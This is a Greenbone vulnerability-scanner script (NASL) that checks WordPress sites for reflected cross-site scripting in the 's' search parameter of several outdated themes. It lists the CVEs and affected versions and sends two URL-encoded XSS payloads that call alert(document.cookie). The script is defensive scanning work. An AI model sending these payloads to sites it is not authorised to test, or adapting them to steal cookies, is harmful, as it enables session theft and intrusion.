# SPDX-FileCopyrightText: 2011 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802250");
  script_version("2025-06-03T05:40:40+0000");
  script_tag(name:"last_modification", value:"2025-06-03 05:40:40 +0000 (Tue, 03 Jun 2025)");
  script_tag(name:"creation_date", value:"2011-10-04 16:55:13 +0200 (Tue, 04 Oct 2011)");
  script_cve_id("CVE-2011-3850", "CVE-2011-3852", "CVE-2011-3854", "CVE-2011-3855",
                "CVE-2011-3856", "CVE-2011-3857", "CVE-2011-3858", "CVE-2011-3860",
                "CVE-2011-3863");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_name("WordPress Multiple Themes 's' Parameter XSS Vulnerabilities (Oct 2011) - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_wordpress_http_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("wordpress/http/detected");

  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/8");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49865");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49867");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49868");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49869");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49872");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49873");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49875");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/49880");
  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/10");
  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/12");
  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/13");
  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/14");
  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/15");
  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/16");
  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/18");
  script_xref(name:"URL", value:"https://sitewat.ch/en/Advisories/22");

  script_tag(name:"summary", value:"At least one theme of WordPress is prone to a cross-site
  scripting (XSS) vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to
  insert arbitrary HTML and script code, which will be executed in a user's browser session
  in the context of an affected site.");

  script_tag(name:"affected", value:"Atahualpa theme before 3.6.8

  EvoLve theme before 1.2.6

  ZenLite theme before 4.4

  Cover WP theme before 1.6.6

  F8 Lite theme before 4.2.2

  Elegant Grunge theme before 1.0.4

  Antisnews theme before 1.10

  Pixiv Custom theme before 2.1.6

  RedLine theme before 1.66");

  script_tag(name:"insight", value:"The flaws are due to improper validation of user-supplied
  input to the 's' Parameter in multiple themes.");

  script_tag(name:"solution", value:"Update to the latest version of the themes.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_analysis");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) )
  exit( 0 );

if( ! dir = get_app_location( cpe:CPE, port:port ) )
  exit( 0 );

if( dir == "/" )
  dir = "";

xploits = make_array(
          "><script>alert\(document\.cookie\)</script>",
          '/?s=%22%20%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E',
          "this.value='&#039;\+alert\(document\.cookie\)\+&amp;#039'",
          "/?s=%26%23039;%2balert(document.cookie)%2b%26%23039");

foreach xploit( keys( xploits ) ) {
  url = dir + xploits[xploit];
  if( http_vuln_check( port:port, url:url, pattern:xploit, check_header:TRUE ) ) {
    report = http_report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
